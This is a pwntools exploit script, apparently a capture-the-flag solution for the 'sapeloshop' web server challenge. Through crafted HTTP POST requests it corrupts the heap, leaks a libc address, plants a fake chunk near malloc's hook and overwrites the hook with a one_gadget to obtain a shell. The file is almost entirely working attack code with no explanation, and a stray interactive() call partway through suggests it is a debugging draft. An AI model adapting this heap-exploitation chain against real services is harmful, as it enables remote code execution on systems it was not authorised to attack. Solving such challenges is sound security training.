from pwn import *

env = {"LD_PRELOAD":"./libc.so.6"}

r = process("./sapeloshop", env=env)
#r = remote("sapeloshop.teaser.insomnihack.ch", 80)

def request(method, URL, length, dt):
	req = method + " "
	req += URL + " "
	req += "HTTP/1.0\r\n"
	req += "Content-Length: " + str(length)
	req += "Connection: keep-alive"
	req += "\r\n\r\n"
	print req
	r.send(req)
	sleep(0.1)
	r.send(dt)


p = "desc="
p += "A"*160
p += "&asdf=bb"
p += "\x00"*(200 - len(p))

request("POST", "/add", 200, p)
r.recvuntil("</html>")

################################

p = "item=0&asdf=bb"
p += "\x00"*(100 - len(p))

request("POST", "/sub", 100, p)
#r.recvuntil("</html>")
r.interactive()
################################

p = "item=0&asdf=bb"
p += "\x00" * (100 - len(p))

request("POST", "/inc", 100, p)
r.recvuntil('<div class="col-md-8"><img src="img/')
rv = r.recv(6)
libc = u64(rv + "\x00\x00")
#libc_base = libc - 0x3c1b58
libc_base = libc - 0x3c4b78
#malloc_fake = libc_base + 0x3c1acd
malloc_fake = libc_base + 0x3c4aed
r.recvuntil("</html>")

print "libc: " + hex(libc)

################################

p = "desc="
p += "B"*96
p += "&asdf=bb"
p += "\x00"*(200 - len(p))

request("POST", "/add", 200, p)
r.recvuntil("</html>")

p = "desc="
p += "C"*96
p += "&asdf=bb"
p += "\x00"*(200 - len(p))

request("POST", "/add", 200, p)
r.recvuntil("</html>")

p = "desc="
p += "D"*96
p += "&asdf=bb"
p += "\x00"*(200 - len(p))

request("POST", "/add", 200, p)
r.recvuntil("</html>")

###############################

p = "item=1&asdf=bb"
p += "\x00"*(100 - len(p))

request("POST", "/sub", 100, p)
r.recvuntil("</html>")

###############################

p = "item=2&asdf=bb"
p += "\x00"*(100 - len(p))

request("POST", "/sub", 100, p)
r.recvuntil("</html>")

###############################

p = "item=1&asdf=bb"
p += "\x00"*(100 - len(p))

request("POST", "/inc", 100, p)
r.recvuntil("</html>")

###############################

p = "item=1&asdf=bb"
p += "\x00"*(100 - len(p))

request("POST", "/sub", 100, p)
r.recvuntil("</html>")

###############################

p = "desc="
for i in range(6):
	p += "%" + hex( (malloc_fake >> (8*i))&0xff )[2:]
p += "%00%00"
p += "D" * (104 - len(p))
p += "&asdf=bb"
p += "\x00"*(200 - len(p))

request("POST", "/add", 200, p)
r.recvuntil("</html>")

p = "desc="
p += "a"*96
p += "&asdf=bb"
p += "\x00"*(200 - len(p))

request("POST", "/add", 200, p)
r.recvuntil("</html>")

p = "desc="
p += "b"*96
p += "&asdf=bb"
p += "\x00"*(200 - len(p))

request("POST", "/add", 200, p)
r.recvuntil("</html>")

raw_input("$")
one_gadget = libc_base + 0xf1147

p = "desc="
p += "A" * 19
p += p64(one_gadget)[:6]
p += "%00%00"
p += "A" * 65
p += "&asdf=bb"
p += "\x00"*(200 - len(p))

request("POST", "/add", 200, p)

req = "POST "
req += "/add "
req += "HTTP/1.0\r\n"
req += "Content-Length: 100"
req += "Connection: keep-alive"
req += "\r\n\r\n"

r.send(req)

sleep(1)
r.send("desc=" + "A"*90 + "&a=bb")

r.interactive()
